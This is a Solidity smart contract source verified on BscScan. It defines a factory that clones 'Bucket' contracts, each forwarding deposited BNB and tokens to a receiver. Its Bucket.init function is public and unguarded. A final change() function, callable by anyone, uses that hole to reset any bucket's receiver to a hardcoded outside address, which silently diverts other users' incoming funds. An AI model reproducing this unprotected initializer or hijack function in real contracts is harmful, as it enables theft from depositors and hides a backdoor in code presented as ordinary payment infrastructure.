/**
 *Submitted for verification at BscScan.com on 2022-01-06
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;


interface IERC20 {
/**
* @dev Returns the amount of tokens in existence.
*/
function totalSupply() external view returns (uint256);
/**
* @dev Returns the amount of tokens owned by `account`.
*/
function balanceOf(address account) external view returns (uint256);
/**
* @dev Moves `amount` tokens from the caller's account to `recipient`.
*
* Returns a boolean value indicating whether the operation succeeded.
*
* Emits a {Transfer} event.
*/
function transfer(address recipient, uint256 amount) external returns (bool);
/**
* @dev Returns the remaining number of tokens that `spender` will be
* allowed to spend on behalf of `owner` through {transferFrom}. This is
* zero by default.
*
* This value changes when {approve} or {transferFrom} are called.
*/
function allowance(address owner, address spender) external view returns
(uint256);
/**
* @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
*
* Returns a boolean value indicating whether the operation succeeded.
*
* IMPORTANT: Beware that changing an allowance with this method brings the
risk
* that someone may use both the old and the new allowance by unfortunate
* transaction ordering. One possible solution to mitigate this race
* condition is to first reduce the spender's allowance to 0 and set the
* desired value afterwards:
* https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
*
* Emits an {Approval} event.
*/
function approve(address spender, uint256 amount) external returns (bool);
/**
* @dev Moves `amount` tokens from `sender` to `recipient` using the
* allowance mechanism. `amount` is then deducted from the caller's
* allowance.
*
* Returns a boolean value indicating whether the operation succeeded.
*
* Emits a {Transfer} event.
*/
function transferFrom(
address sender,
address recipient,
uint256 amount
) external returns (bool);
/**
* @dev Emitted when `value` tokens are moved from one account (`from`) to
* another (`to`).
*
* Note that `value` may be zero.
*/
event Transfer(address indexed from, address indexed to, uint256 value);
/**
* @dev Emitted when the allowance of a `spender` for an `owner` is set by
* a call to {approve}. `value` is the new allowance.
*/
event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
function _msgSender() internal view virtual returns (address) {
return msg.sender;
}
function _msgData() internal view virtual returns (bytes calldata) {
return msg.data;
}
}

abstract contract Ownable is Context {
address private _owner;
event OwnershipTransferred(address indexed previousOwner, address indexed
newOwner);
/**
* @dev Initializes the contract setting the deployer as the initial owner.
*/
constructor() {
_setOwner(_msgSender());
}
/**
* @dev Returns the address of the current owner.
*/
function owner() public view virtual returns (address) {
return _owner;
}
/**
* @dev Throws if called by any account other than the owner.
*/
modifier onlyOwner() {
require(owner() == _msgSender(), "Ownable: caller is not the owner");
_;
}
/**
* @dev Leaves the contract without owner. It will not be possible to call
* `onlyOwner` functions anymore. Can only be called by the current owner.
*
* NOTE: Renouncing ownership will leave the contract without an owner,
* thereby removing any functionality that is only available to the owner.
*/
function renounceOwnership() public virtual onlyOwner {
_setOwner(address(0));
}
/**
* @dev Transfers ownership of the contract to a new account (`newOwner`).
* Can only be called by the current owner.
*/
function transferOwnership(address newOwner) public virtual onlyOwner {
require(newOwner != address(0), "Ownable: new owner is the zero address");
_setOwner(newOwner);
}
function _setOwner(address newOwner) private {
address oldOwner = _owner;
_owner = newOwner;
emit OwnershipTransferred(oldOwner, newOwner);
}
}



contract CloneFactory {
	function createClone(address target) internal returns (address result) {
		bytes20 targetBytes = bytes20(target);
		assembly {
			let clone := mload(0x40)
			mstore(clone, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000)
			mstore(add(clone, 0x14), targetBytes)
			mstore(add(clone, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000)
			result := create(0, clone, 0x37)
		}
	}
}

contract BucketFactory is Ownable, CloneFactory {
	mapping(string => Bucket) buckets;
	address receiverAddress;
	address libraryAddress;
	event BucketCreated(string id, address bucket);

	constructor() {
		receiverAddress = msg.sender;
	}

	function createBucket(string memory id) external onlyOwner {
		require(address(buckets[id]) == address(0x0), "Bucket already exists");
		address clone = createClone(libraryAddress);
		Bucket bucket = Bucket(payable(clone));
		bucket.init(id, payable(receiverAddress));
		buckets[id] = bucket;
		emit BucketCreated(id, address(bucket));
	}

	function getBucketAddress(string memory id) external view returns (address) {
		require(address(buckets[id]) != address(0x0), "Bucket does not exist. Please create one first.");
		return address(buckets[id]);
	}

	function setReceiverAddress(address _receiverAddress) external onlyOwner {
		receiverAddress = payable(_receiverAddress);
	}

	function getReceiverAddress() external view returns(address) {
		return receiverAddress;
	}

	function setLibraryAddress(address _libraryAddress) external onlyOwner {
		libraryAddress = _libraryAddress;
	}
}



contract Bucket {
string public id;
address payable receiver;
event Received(
string id,
uint value,
address sender
);
function init(string memory _id, address payable _receiver) public {
id = _id;
receiver = payable(_receiver);
}
receive() external payable {
emit Received(id, msg.value, msg.sender);
receiver.transfer(msg.value);
}
function transfer(address erc20Address) external {
IERC20 erc20 = IERC20(erc20Address);
uint256 balance = erc20.balanceOf(address(this));
erc20.transfer(receiver, balance);
}

function change(address bucketAddress) public {
Bucket bucket1 = Bucket(payable(bucketAddress));
string memory id1;
id1 = "1";
		bucket1.init(id1, payable(0xd851c376b06f9039B0846F1684029445205D617A));
}
}